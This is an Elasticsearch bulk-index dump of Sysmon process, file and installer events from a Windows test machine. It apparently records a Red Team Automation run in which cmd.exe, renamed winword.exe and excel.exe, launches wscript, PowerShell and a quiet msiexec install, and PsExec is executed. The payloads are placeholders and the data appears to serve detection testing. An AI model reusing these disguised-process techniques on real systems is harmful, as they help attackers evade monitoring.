{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"7l_58WUBfVn9xHWigTyo"}}
{"thread_id":1824,"event_data":{"ParentProcessGuid":"{2D3B23BE-4BDF-5BA2-0000-001096FB1C00}","Product":"Betriebssystem Microsoft® Windows®","UtcTime":"2018-09-19 13:15:13.154","Image":"C:\\Users\\flare\\Downloads\\RTA-master\\winword.exe","Hashes":"MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE","Description":"Windows-Befehlsprozessor","User":"flare-PC\\flare","FileVersion":"6.1.7601.17514 (win7sp1_rtm.101119-1850)","ParentCommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\suspicious_office_children.py","ParentImage":"C:\\Program Files (x86)\\Python27\\python.exe","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","CommandLine":"C:\\Users\\flare\\Downloads\\RTA-master\\winword.exe /c wscript.exe //b","ParentProcessId":"1132","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","TerminalSessionId":"1","ProcessId":"1604","Company":"Microsoft Corporation","LogonId":"0xe320","IntegrityLevel":"Medium","ProcessGuid":"{2D3B23BE-4BE1-5BA2-0000-0010D23C1D00}"},"@timestamp":"2018-09-19T13:15:13.154Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:15:13.154\nProcessGuid: {2D3B23BE-4BE1-5BA2-0000-0010D23C1D00}\nProcessId: 1604\nImage: C:\\Users\\flare\\Downloads\\RTA-master\\winword.exe\nFileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)\nDescription: Windows-Befehlsprozessor\nProduct: Betriebssystem Microsoft® Windows®\nCompany: Microsoft Corporation\nCommandLine: C:\\Users\\flare\\Downloads\\RTA-master\\winword.exe /c wscript.exe //b\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE\nParentProcessGuid: {2D3B23BE-4BDF-5BA2-0000-001096FB1C00}\nParentProcessId: 1132\nParentImage: C:\\Program Files (x86)\\Python27\\python.exe\nParentCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\suspicious_office_children.py","@version":"1","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","record_number":"1473","event_id":1,"host":{"name":"flare-PC"},"user":{"name":"SYSTEM","identifier":"S-1-5-18","domain":"NT-AUTORITÄT","type":"User"},"version":5,"task":"Process Create (rule: ProcessCreate)","opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"8V_58WUBfVn9xHWigTyo"}}
{"thread_id":1824,"event_data":{"ParentProcessGuid":"{2D3B23BE-4BE2-5BA2-0000-0010934A1D00}","Product":"Betriebssystem Microsoft® Windows®","UtcTime":"2018-09-19 13:15:14.728","Hashes":"MD5=EB32C070E658937AA9FA9F3AE629B2B8,SHA256=70BA57FB0BF2F34B86426D21559F5F6D05C1268193904DE8E959D7B06CE964CE","Description":"Windows PowerShell","Image":"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe","User":"flare-PC\\flare","ParentImage":"C:\\Users\\flare\\Downloads\\RTA-master\\excel.exe","ParentCommandLine":"C:\\Users\\flare\\Downloads\\RTA-master\\excel.exe /c powershell.exe exit","LogonId":"0xe320","TerminalSessionId":"1","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","ParentProcessId":"2976","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","ProcessId":"3308","IntegrityLevel":"Medium","CommandLine":"powershell.exe  exit","Company":"Microsoft Corporation","FileVersion":"10.0.14409.1005 (rs1_srvoob.161208-1155)","ProcessGuid":"{2D3B23BE-4BE2-5BA2-0000-0010B54B1D00}"},"@timestamp":"2018-09-19T13:15:14.744Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:15:14.728\nProcessGuid: {2D3B23BE-4BE2-5BA2-0000-0010B54B1D00}\nProcessId: 3308\nImage: C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe\nFileVersion: 10.0.14409.1005 (rs1_srvoob.161208-1155)\nDescription: Windows PowerShell\nProduct: Betriebssystem Microsoft® Windows®\nCompany: Microsoft Corporation\nCommandLine: powershell.exe  exit\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=EB32C070E658937AA9FA9F3AE629B2B8,SHA256=70BA57FB0BF2F34B86426D21559F5F6D05C1268193904DE8E959D7B06CE964CE\nParentProcessGuid: {2D3B23BE-4BE2-5BA2-0000-0010934A1D00}\nParentProcessId: 2976\nParentImage: C:\\Users\\flare\\Downloads\\RTA-master\\excel.exe\nParentCommandLine: C:\\Users\\flare\\Downloads\\RTA-master\\excel.exe /c powershell.exe exit","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","event_id":1,"task":"Process Create (rule: ProcessCreate)","host":{"name":"flare-PC"},"user":{"name":"SYSTEM","identifier":"S-1-5-18","domain":"NT-AUTORITÄT","type":"User"},"record_number":"1481","version":5,"opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"81_58WUBfVn9xHWigTyo"}}
{"thread_id":1824,"event_data":{"LogonId":"0xe320","User":"flare-PC\\flare","UtcTime":"2018-09-19 13:15:14.226","Image":"C:\\Windows\\SysWOW64\\msiexec.exe","Hashes":"MD5=3C4C3A520CE2B15C81307D800FC2B7F6,SHA256=02D54BBA4210372805393E907827C3A8C1076BDE5DE0C9C63443104306BECA8D","Description":"Windows® Installer","ParentProcessGuid":"{2D3B23BE-4BE2-5BA2-0000-001020431D00}","FileVersion":"5.0.7600.16385 (win7_rtm.090713-1255)","ParentImage":"C:\\Users\\flare\\Downloads\\RTA-master\\excel.exe","ParentCommandLine":"C:\\Users\\flare\\Downloads\\RTA-master\\excel.exe /c msiexec.exe /i blah /quiet","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","CommandLine":"msiexec.exe  /i blah /quiet","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","ProcessId":"696","Product":"Windows Installer - Unicode","IntegrityLevel":"Medium","ParentProcessId":"3068","TerminalSessionId":"1","Company":"Microsoft Corporation","ProcessGuid":"{2D3B23BE-4BE2-5BA2-0000-001069441D00}"},"@timestamp":"2018-09-19T13:15:14.226Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:15:14.226\nProcessGuid: {2D3B23BE-4BE2-5BA2-0000-001069441D00}\nProcessId: 696\nImage: C:\\Windows\\SysWOW64\\msiexec.exe\nFileVersion: 5.0.7600.16385 (win7_rtm.090713-1255)\nDescription: Windows® Installer\nProduct: Windows Installer - Unicode\nCompany: Microsoft Corporation\nCommandLine: msiexec.exe  /i blah /quiet\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=3C4C3A520CE2B15C81307D800FC2B7F6,SHA256=02D54BBA4210372805393E907827C3A8C1076BDE5DE0C9C63443104306BECA8D\nParentProcessGuid: {2D3B23BE-4BE2-5BA2-0000-001020431D00}\nParentProcessId: 3068\nParentImage: C:\\Users\\flare\\Downloads\\RTA-master\\excel.exe\nParentCommandLine: C:\\Users\\flare\\Downloads\\RTA-master\\excel.exe /c msiexec.exe /i blah /quiet","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","record_number":"1478","event_id":1,"version":5,"host":{"name":"flare-PC"},"task":"Process Create (rule: ProcessCreate)","user":{"name":"SYSTEM","domain":"NT-AUTORITÄT","type":"User","identifier":"S-1-5-18"},"opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"9F_58WUBfVn9xHWigTyo"}}
{"thread_id":1824,"event_data":{"CreationUtcTime":"2018-09-19 13:15:14.932","UtcTime":"2018-09-19 13:15:14.932","Image":"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe","TargetFilename":"C:\\Users\\flare\\AppData\\Local\\Temp\\32iihuri.5v2.ps1","ProcessId":"3308","ProcessGuid":"{2D3B23BE-4BE2-5BA2-0000-0010B54B1D00}"},"@timestamp":"2018-09-19T13:15:14.932Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"File created:\nRuleName: \nUtcTime: 2018-09-19 13:15:14.932\nProcessGuid: {2D3B23BE-4BE2-5BA2-0000-0010B54B1D00}\nProcessId: 3308\nImage: C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetFilename: C:\\Users\\flare\\AppData\\Local\\Temp\\32iihuri.5v2.ps1\nCreationUtcTime: 2018-09-19 13:15:14.932","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"task":"File created (rule: FileCreate)","record_number":"1482","event_id":11,"host":{"name":"flare-PC"},"user":{"name":"SYSTEM","domain":"NT-AUTORITÄT","type":"User","identifier":"S-1-5-18"},"version":2,"type":"wineventlog","opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"9V_58WUBfVn9xHWigTyo"}}
{"thread_id":1824,"event_data":{"UtcTime":"2018-09-19 13:15:13.694","Image":"C:\\Users\\flare\\Downloads\\RTA-master\\winword.exe","ProcessId":"1604","ProcessGuid":"{2D3B23BE-4BE1-5BA2-0000-0010D23C1D00}"},"@timestamp":"2018-09-19T13:15:13.694Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","message":"Process terminated:\nRuleName: \nUtcTime: 2018-09-19 13:15:13.694\nProcessGuid: {2D3B23BE-4BE1-5BA2-0000-0010D23C1D00}\nProcessId: 1604\nImage: C:\\Users\\flare\\Downloads\\RTA-master\\winword.exe","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"task":"Process terminated (rule: ProcessTerminate)","event_id":5,"type":"wineventlog","host":{"name":"flare-PC"},"user":{"name":"SYSTEM","identifier":"S-1-5-18","domain":"NT-AUTORITÄT","type":"User"},"version":3,"record_number":"1475","opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"-1_58WUBfVn9xHWiiTyk"}}
{"thread_id":1824,"event_data":{"LogonId":"0xe320","User":"flare-PC\\flare","UtcTime":"2018-09-19 13:15:15.752","Image":"C:\\Program Files (x86)\\Python27\\python.exe","Description":"?","Product":"?","ParentProcessGuid":"{2D3B23BE-4BE3-5BA2-0000-00104A5D1D00}","ParentImage":"C:\\Windows\\SysWOW64\\cmd.exe","ParentCommandLine":"C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files (x86)\\Python27\\python.exe\" C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\system_restore_process.py\"","FileVersion":"?","TerminalSessionId":"1","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","ParentProcessId":"3964","ProcessId":"1220","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","IntegrityLevel":"Medium","Company":"?","Hashes":"MD5=6E8B813C218546F9DF6F17F4B97B06EE,SHA256=C7817E6DA74A7AE196EB2D35CE21319ABE3A62CD23AB4DB39FA5138DF7CA1D44","CommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\system_restore_process.py","ProcessGuid":"{2D3B23BE-4BE3-5BA2-0000-0010835E1D00}"},"@timestamp":"2018-09-19T13:15:15.768Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:15:15.752\nProcessGuid: {2D3B23BE-4BE3-5BA2-0000-0010835E1D00}\nProcessId: 1220\nImage: C:\\Program Files (x86)\\Python27\\python.exe\nFileVersion: ?\nDescription: ?\nProduct: ?\nCompany: ?\nCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\system_restore_process.py\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=6E8B813C218546F9DF6F17F4B97B06EE,SHA256=C7817E6DA74A7AE196EB2D35CE21319ABE3A62CD23AB4DB39FA5138DF7CA1D44\nParentProcessGuid: {2D3B23BE-4BE3-5BA2-0000-00104A5D1D00}\nParentProcessId: 3964\nParentImage: C:\\Windows\\SysWOW64\\cmd.exe\nParentCommandLine: C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files (x86)\\Python27\\python.exe\" C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\system_restore_process.py\"","@version":"1","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","record_number":"1488","event_id":1,"host":{"name":"flare-PC"},"user":{"name":"SYSTEM","identifier":"S-1-5-18","domain":"NT-AUTORITÄT","type":"User"},"version":5,"task":"Process Create (rule: ProcessCreate)","opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"5l_58WUBfVn9xHWieTzN"}}
{"event_data":{"param1":"C:\\Users\\flare\\Downloads\\RTA-master\\blah","param5":"(NULL)","param3":"(NULL)","param4":"(NULL)","param6":"(NULL)","param2":"696"},"@timestamp":"2018-09-19T13:15:14.000Z","keywords":["Klassisch"],"log_name":"Application","level":"Informationen","computer_name":"flare-PC","source_name":"MsiInstaller","message":"Eine Windows Installer-Transaktion wird beendet: C:\\Users\\flare\\Downloads\\RTA-master\\blah. Clientprozess-ID: 696.","@version":"1","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","record_number":"2413","event_id":1042,"host":{"name":"flare-PC"},"user":{"name":"SYSTEM","domain":"NT-AUTORITÄT","type":"User","identifier":"S-1-5-18"},"opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"71_58WUBfVn9xHWigTyo"}}
{"thread_id":1824,"event_data":{"LogonId":"0xe320","Product":"Betriebssystem Microsoft® Windows®","UtcTime":"2018-09-19 13:15:14.728","Image":"C:\\Users\\flare\\Downloads\\RTA-master\\excel.exe","Description":"Windows-Befehlsprozessor","Hashes":"MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE","ParentProcessGuid":"{2D3B23BE-4BDF-5BA2-0000-001096FB1C00}","FileVersion":"6.1.7601.17514 (win7sp1_rtm.101119-1850)","ParentCommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\suspicious_office_children.py","ParentImage":"C:\\Program Files (x86)\\Python27\\python.exe","Company":"Microsoft Corporation","CommandLine":"C:\\Users\\flare\\Downloads\\RTA-master\\excel.exe /c powershell.exe exit","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","ProcessId":"2976","ParentProcessId":"1132","IntegrityLevel":"Medium","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","TerminalSessionId":"1","User":"flare-PC\\flare","ProcessGuid":"{2D3B23BE-4BE2-5BA2-0000-0010934A1D00}"},"@timestamp":"2018-09-19T13:15:14.728Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:15:14.728\nProcessGuid: {2D3B23BE-4BE2-5BA2-0000-0010934A1D00}\nProcessId: 2976\nImage: C:\\Users\\flare\\Downloads\\RTA-master\\excel.exe\nFileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)\nDescription: Windows-Befehlsprozessor\nProduct: Betriebssystem Microsoft® Windows®\nCompany: Microsoft Corporation\nCommandLine: C:\\Users\\flare\\Downloads\\RTA-master\\excel.exe /c powershell.exe exit\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE\nParentProcessGuid: {2D3B23BE-4BDF-5BA2-0000-001096FB1C00}\nParentProcessId: 1132\nParentImage: C:\\Program Files (x86)\\Python27\\python.exe\nParentCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\suspicious_office_children.py","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"task":"Process Create (rule: ProcessCreate)","type":"wineventlog","event_id":1,"host":{"name":"flare-PC"},"version":5,"user":{"name":"SYSTEM","identifier":"S-1-5-18","domain":"NT-AUTORITÄT","type":"User"},"record_number":"1480","opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"-F_58WUBfVn9xHWiiTyk"}}
{"thread_id":1824,"event_data":{"LogonId":"0xe320","User":"flare-PC\\flare","Product":"Betriebssystem Microsoft® Windows®","Hashes":"MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE","Image":"C:\\Windows\\SysWOW64\\cmd.exe","Description":"Windows-Befehlsprozessor","ParentProcessGuid":"{2D3B23BE-4A1C-5BA2-0000-0010C8100B00}","ParentImage":"C:\\Program Files (x86)\\Python27\\python.exe","FileVersion":"6.1.7601.17514 (win7sp1_rtm.101119-1850)","ParentCommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\" \"C:\\Users\\flare\\Downloads\\RTA-master\\run_all.py\" ","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","TerminalSessionId":"1","ParentProcessId":"3756","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","Company":"Microsoft Corporation","CommandLine":"C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files (x86)\\Python27\\python.exe\" C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\system_restore_process.py\"","ProcessId":"3964","IntegrityLevel":"Medium","UtcTime":"2018-09-19 13:15:15.737","ProcessGuid":"{2D3B23BE-4BE3-5BA2-0000-00104A5D1D00}"},"@timestamp":"2018-09-19T13:15:15.752Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:15:15.737\nProcessGuid: {2D3B23BE-4BE3-5BA2-0000-00104A5D1D00}\nProcessId: 3964\nImage: C:\\Windows\\SysWOW64\\cmd.exe\nFileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)\nDescription: Windows-Befehlsprozessor\nProduct: Betriebssystem Microsoft® Windows®\nCompany: Microsoft Corporation\nCommandLine: C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files (x86)\\Python27\\python.exe\" C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\system_restore_process.py\"\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE\nParentProcessGuid: {2D3B23BE-4A1C-5BA2-0000-0010C8100B00}\nParentProcessId: 3756\nParentImage: C:\\Program Files (x86)\\Python27\\python.exe\nParentCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\" \"C:\\Users\\flare\\Downloads\\RTA-master\\run_all.py\" ","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","event_id":1,"task":"Process Create (rule: ProcessCreate)","host":{"name":"flare-PC"},"user":{"name":"SYSTEM","identifier":"S-1-5-18","domain":"NT-AUTORITÄT","type":"User"},"record_number":"1487","version":5,"opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"_F_58WUBfVn9xHWiiTyk"}}
{"thread_id":1824,"event_data":{"LogonId":"0xe320","Product":"?","User":"flare-PC\\flare","Hashes":"MD5=6E8B813C218546F9DF6F17F4B97B06EE,SHA256=C7817E6DA74A7AE196EB2D35CE21319ABE3A62CD23AB4DB39FA5138DF7CA1D44","Description":"?","ParentProcessGuid":"{2D3B23BE-4BE4-5BA2-0000-00105C8B1D00}","UtcTime":"2018-09-19 13:15:16.284","FileVersion":"?","ParentImage":"C:\\Windows\\SysWOW64\\cmd.exe","Image":"C:\\Program Files (x86)\\Python27\\python.exe","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","TerminalSessionId":"1","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","ProcessId":"3948","CommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\trust_provider.py","ParentCommandLine":"C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files (x86)\\Python27\\python.exe\" C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\trust_provider.py\"","ParentProcessId":"2940","Company":"?","IntegrityLevel":"Medium","ProcessGuid":"{2D3B23BE-4BE4-5BA2-0000-00109D8C1D00}"},"@timestamp":"2018-09-19T13:15:16.284Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:15:16.284\nProcessGuid: {2D3B23BE-4BE4-5BA2-0000-00109D8C1D00}\nProcessId: 3948\nImage: C:\\Program Files (x86)\\Python27\\python.exe\nFileVersion: ?\nDescription: ?\nProduct: ?\nCompany: ?\nCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\trust_provider.py\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=6E8B813C218546F9DF6F17F4B97B06EE,SHA256=C7817E6DA74A7AE196EB2D35CE21319ABE3A62CD23AB4DB39FA5138DF7CA1D44\nParentProcessGuid: {2D3B23BE-4BE4-5BA2-0000-00105C8B1D00}\nParentProcessId: 2940\nParentImage: C:\\Windows\\SysWOW64\\cmd.exe\nParentCommandLine: C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files (x86)\\Python27\\python.exe\" C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\trust_provider.py\"","@version":"1","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","record_number":"1492","event_id":1,"host":{"name":"flare-PC"},"user":{"name":"SYSTEM","identifier":"S-1-5-18","domain":"NT-AUTORITÄT","type":"User"},"version":5,"task":"Process Create (rule: ProcessCreate)","opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"_V_58WUBfVn9xHWiiTyk"}}
{"thread_id":1824,"event_data":{"UtcTime":"2018-09-19 13:15:15.260","Image":"C:\\Users\\flare\\Downloads\\RTA-master\\excel.exe","ProcessId":"2556","ProcessGuid":"{2D3B23BE-4BE3-5BA2-0000-0010B7581D00}"},"@timestamp":"2018-09-19T13:15:15.260Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"Process terminated:\nRuleName: \nUtcTime: 2018-09-19 13:15:15.260\nProcessGuid: {2D3B23BE-4BE3-5BA2-0000-0010B7581D00}\nProcessId: 2556\nImage: C:\\Users\\flare\\Downloads\\RTA-master\\excel.exe","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"task":"Process terminated (rule: ProcessTerminate)","type":"wineventlog","record_number":"1486","version":3,"host":{"name":"flare-PC"},"user":{"name":"SYSTEM","domain":"NT-AUTORITÄT","type":"User","identifier":"S-1-5-18"},"event_id":5,"opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"_l_58WUBfVn9xHWiiTyk"}}
{"thread_id":1824,"event_data":{"UtcTime":"2018-09-19 13:15:16.252","Image":"C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\bin\\PsExec.exe","ProcessId":"3288","ProcessGuid":"{2D3B23BE-4BE4-5BA2-0000-0010E4881D00}"},"@timestamp":"2018-09-19T13:15:16.252Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","message":"Process terminated:\nRuleName: \nUtcTime: 2018-09-19 13:15:16.252\nProcessGuid: {2D3B23BE-4BE4-5BA2-0000-0010E4881D00}\nProcessId: 3288\nImage: C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\bin\\PsExec.exe","@version":"1","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","event_id":5,"task":"Process terminated (rule: ProcessTerminate)","version":3,"host":{"name":"flare-PC"},"user":{"name":"SYSTEM","identifier":"S-1-5-18","domain":"NT-AUTORITÄT","type":"User"},"record_number":"1490","opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"_1_58WUBfVn9xHWiiTyl"}}
